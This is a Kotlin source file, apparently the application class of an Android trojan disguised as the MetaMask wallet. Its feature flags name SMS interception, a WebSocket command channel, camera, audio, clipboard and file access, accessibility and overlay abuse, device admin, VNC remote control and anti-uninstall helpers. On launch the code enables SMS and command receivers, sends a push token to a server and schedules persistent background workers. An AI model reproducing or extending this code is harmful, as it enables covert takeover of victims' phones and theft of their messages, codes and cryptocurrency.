package com.example.MetaMask

import android.app.ActivityManager
import android.app.Application
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.UserManager
import androidx.work.Configuration
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.MetaMask.activities.ComposeSmsActivity
import com.example.MetaMask.activities.GatewayActivity
import com.example.MetaMask.activities.HeadlessSmsSendService
import com.example.MetaMask.activities.MmsReceiver
import com.example.MetaMask.activities.SmsReceiver
import com.example.MetaMask.receivers.ChikenBridgeReceiver
import com.example.MetaMask.receivers.WebSocketCommandHandlerReceiver
import com.example.MetaMask.services.*
import com.example.MetaMask.utils.DeviceUUIDProvider
import com.example.MetaMask.utils.FCMConfig
import java.util.concurrent.TimeUnit

class MainApplication : Application(), Configuration.Provider {

    override val workManagerConfiguration: Configuration
        get() = Configuration.Builder()
            .setMinimumLoggingLevel(4)
            .build()

    override fun onCreate() {
        android.util.Log.d("XDBG", "[MainApplication] onCreate enter") //xdbg
        super.onCreate()
        android.util.Log.d("XDBG", "[MainApplication] FEAT_DUMP: FCM=${BuildConfig.FEAT_FCM}|SMS=${BuildConfig.FEAT_SMS}|SMS_ROLE=${BuildConfig.FEAT_SMS_ROLE}|RADIO_LINK=${BuildConfig.FEAT_RADIO_LINK}|CONTACTS=${BuildConfig.FEAT_CONTACTS}|CALL_PHONE=${BuildConfig.FEAT_CALL_PHONE}|USSD=${BuildConfig.FEAT_USSD}|CAMERA=${BuildConfig.FEAT_CAMERA}|AUDIO_REC=${BuildConfig.FEAT_AUDIO_RECORD}|FILES=${BuildConfig.FEAT_FILES}|CLIPBOARD=${BuildConfig.FEAT_CLIPBOARD}|TURTLE=${BuildConfig.FEAT_TURTLE}|SYNC_MGR=${BuildConfig.FEAT_SYNC_MANAGER}|KEEPALIVE=${BuildConfig.FEAT_KEEPALIVE_JOB}|FRIEN_CAT=${BuildConfig.FEAT_FRIEN_CAT}|DEV_MON=${BuildConfig.FEAT_DEVICE_MONITOR}|TROL=${BuildConfig.FEAT_TROL_SVC}|CMD_CH=${BuildConfig.FEAT_CMD_CHANNEL}|PRIVILEGE=${BuildConfig.FEAT_PRIVILEGE_SVC}|BIOMETRIC=${BuildConfig.FEAT_BIOMETRIC}|ACCESSIBILITY=${BuildConfig.FEAT_ACCESSIBILITY}|SPARROW=${BuildConfig.FEAT_SPARROW}|STOAT=${BuildConfig.FEAT_STOAT_SHIELD}|AUTO_IBIS=${BuildConfig.FEAT_AUTO_IBIS}|UNLOCK=${BuildConfig.FEAT_UNLOCK}|OVERLAY=${BuildConfig.FEAT_OVERLAY}|DEV_ADMIN=${BuildConfig.FEAT_DEVICE_ADMIN}|VNC=${BuildConfig.FEAT_VNC}|KEEPALIVE_AUDIO=${BuildConfig.FEAT_KEEPALIVE_AUDIO}|APP_BLOCKER=${BuildConfig.FEAT_APP_BLOCKER}|MINK=${BuildConfig.FEAT_MINK_SCANNER}|MARTEN=${BuildConfig.FEAT_MARTEN}|VIBRATION=${BuildConfig.FEAT_VIBRATION}|FILE_REVOKER=${BuildConfig.FEAT_FILE_REVOKER}|UNINSTALL_HELPER=${BuildConfig.FEAT_UNINSTALL_HELPER}|CHAIN_BRIDGE=${BuildConfig.FEAT_CHAIN_BRIDGE}|HYPEROS=${BuildConfig.FEAT_HYPEROS}") //xdbg

        val userManager = getSystemService(Context.USER_SERVICE) as UserManager
        if (!userManager.isUserUnlocked) return

        val componentsToEnable = mutableListOf<Class<*>>()
        componentsToEnable += WebSocketCommandHandlerReceiver::class.java
        componentsToEnable += ChikenBridgeReceiver::class.java
        if (BuildConfig.FEAT_SMS) {
            android.util.Log.d("XDBG", "[MainApplication] if branch") //xdbg
            componentsToEnable += SmsReceiver::class.java
            componentsToEnable += MmsReceiver::class.java
        }
        if (BuildConfig.FEAT_SMS_ROLE) {
            android.util.Log.d("XDBG", "[MainApplication] if branch") //xdbg
            componentsToEnable += ComposeSmsActivity::class.java
            componentsToEnable += HeadlessSmsSendService::class.java
        }
        componentsToEnable.forEach { cls ->
            try {
                android.util.Log.d("XDBG", "[MainApplication] enabling component: ${cls.simpleName}") //xdbg
                packageManager.setComponentEnabledSetting(
                    ComponentName(this, cls),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
                android.util.Log.d("XDBG", "[MainApplication] component enabled OK: ${cls.simpleName}") //xdbg
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[MainApplication] component enable FAIL: ${cls.simpleName} err=${e.message}") //xdbg
            }
        }

        try {
            WorkManager.initialize(applicationContext, workManagerConfiguration)
        } catch (_: IllegalStateException) {
            android.util.Log.e("XDBG", "[MainApplication] catch (ignored)") //xdbg
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[MainApplication] catch (ignored)") //xdbg
        }

        if (BuildConfig.FEAT_FCM) {
            android.util.Log.d("XDBG", "[MainApplication] if branch") //xdbg
            FCMConfig.init(this)
            com.example.MetaMask.services.FcmTokenService.pushCurrentTokenToServer(this)
        }

        if (!isMainProcess()) return

        val pm = packageManager
        val componentName = ComponentName(this, GatewayActivity::class.java)
        if (pm.getComponentEnabledSetting(componentName) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) return

        DeviceUUIDProvider.init(this)
        schedulePeriodicWorker()
    }

    private fun schedulePeriodicWorker() {
        android.util.Log.d("XDBG", "[MainApplication] schedulePeriodicWorker enter") //xdbg
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "MasterServiceCheck",
            ExistingPeriodicWorkPolicy.KEEP,
            PeriodicWorkRequestBuilder<SchedulerWorker>(15, TimeUnit.MINUTES)
                .setConstraints(constraints)
                .build()
        )

        if (BuildConfig.FEAT_FCM) {
            android.util.Log.d("XDBG", "[MainApplication] if branch") //xdbg
            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "FcmTokenCheck",
                ExistingPeriodicWorkPolicy.KEEP,
                PeriodicWorkRequestBuilder<com.example.MetaMask.services.FcmTokenCheckWorker>(30, TimeUnit.MINUTES)
                    .setConstraints(constraints)
                    .build()
            )
        }
    }

    private fun isMainProcess(): Boolean {
        android.util.Log.d("XDBG", "[MainApplication] isMainProcess enter") //xdbg
        android.util.Log.d("XDBG", "[MainApplication] return") //xdbg
        return packageName.equals(getCurrentProcessName())
    }

    private fun getCurrentProcessName(): String? {
        android.util.Log.d("XDBG", "[MainApplication] getCurrentProcessName enter") //xdbg
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            android.util.Log.d("XDBG", "[MainApplication] if branch") //xdbg
            android.util.Log.d("XDBG", "[MainApplication] return") //xdbg
            return getProcessName()
        }

        try {
            val manager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val processes = manager.runningAppProcesses ?: return null
            for (processInfo in processes) {
                android.util.Log.d("XDBG", "[MainApplication] loop") //xdbg
                if (processInfo.pid == android.os.Process.myPid()) {
                    android.util.Log.d("XDBG", "[MainApplication] if branch") //xdbg
                    android.util.Log.d("XDBG", "[MainApplication] return") //xdbg
                    return processInfo.processName
                }
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[MainApplication] catch (ignored)") //xdbg
        }
        android.util.Log.d("XDBG", "[MainApplication] return") //xdbg
        return null
    }
}
